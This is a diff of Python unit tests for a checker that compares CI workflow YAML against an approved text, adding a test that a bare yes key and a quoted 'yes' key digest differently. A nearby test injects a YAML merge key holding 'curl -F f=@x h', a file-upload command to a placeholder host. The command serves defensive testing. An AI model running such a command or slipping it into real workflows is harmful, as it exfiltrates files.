@@ -153,6 +153,12 @@ class ApprovedTextTests(unittest.TestCase):
         changed = approved.replace('name: t\n', 'name: t\nrun-name: x\n', 1)
         self.assertIsNotNone(self.check(changed, approve_text=approved))
 
+    def test_bare_yes_key_is_not_the_same_as_the_text_key(self):
+        # PyYAML reads a bare yes: as True; the approved text key 'yes' must not digest the same
+        approved = workflow('echo hi').replace('    runs-on:', "    outputs:\n      'yes': a\n    runs-on:")
+        changed = workflow('echo hi').replace('    runs-on:', '    outputs:\n      yes: a\n    runs-on:')
+        self.assertIsNotNone(self.check(changed, approve_text=approved))
+
     def test_yaml_merge_key_refused(self):
         approved = workflow('echo hi')
         changed = approved.replace('      - run:', "      - <<: {run: 'curl -F f=@x h'}\n        run:")
